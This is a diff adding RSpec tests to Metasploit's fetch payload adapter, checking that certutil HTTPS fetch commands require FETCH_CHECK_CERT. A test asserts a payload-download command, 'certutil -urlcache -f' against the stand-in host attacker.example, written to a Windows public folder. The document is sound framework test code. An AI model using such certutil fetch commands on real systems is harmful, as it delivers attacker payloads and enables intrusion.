@@ -162,6 +162,64 @@ RSpec.describe Msf::Payload::Adapter::Fetch do
     end
   end
 
+  # Regression coverage for #20453: the certutil fetch path never read
+  # FETCH_CHECK_CERT, so an HTTPS fetch always failed - even when the operator
+  # had opted in and supplied a trusted certificate. certutil has no insecure
+  # mode, so the correct behaviour (mirroring the GET path) is to require
+  # FETCH_CHECK_CERT for HTTPS, then build the HTTPS command when it is set.
+  describe '#_generate_certutil_command' do
+    let(:harness_class) do
+      Class.new do
+        include Msf::Payload::Adapter::Fetch
+
+        def initialize(check_cert:)
+          @datastore = { 'FETCH_CHECK_CERT' => check_cert }
+        end
+        attr_reader :datastore
+
+        def fetch_protocol
+          'HTTPS'
+        end
+
+        def download_uri(_uri)
+          'attacker.example:8443/payload_uri'
+        end
+
+        def _remote_destination
+          'C:\\Users\\Public\\payload'
+        end
+
+        def _execute_add(get_file_cmd)
+          get_file_cmd
+        end
+
+        def fail_with(_reason, msg = nil)
+          raise Msf::Exploit::Failed, msg
+        end
+
+        def print_error(_msg); end
+      end
+    end
+
+    context 'when FETCH_CHECK_CERT is not set' do
+      subject(:harness) { harness_class.new(check_cert: false) }
+
+      it 'fails and tells the operator to enable FETCH_CHECK_CERT' do
+        expect { harness.send(:_generate_certutil_command, 'payload_uri') }
+          .to raise_error(Msf::Exploit::Failed, /FETCH_CHECK_CERT must be true/)
+      end
+    end
+
+    context 'when FETCH_CHECK_CERT is set' do
+      subject(:harness) { harness_class.new(check_cert: true) }
+
+      it 'builds an HTTPS certutil fetch command' do
+        cmd = harness.send(:_generate_certutil_command, 'payload_uri')
+        expect(cmd).to include('certutil -urlcache -f https://attacker.example:8443/payload_uri')
+      end
+    end
+  end
+
   describe '#_generate_tftp_command' do
     let(:harness_class) do
       Class.new do
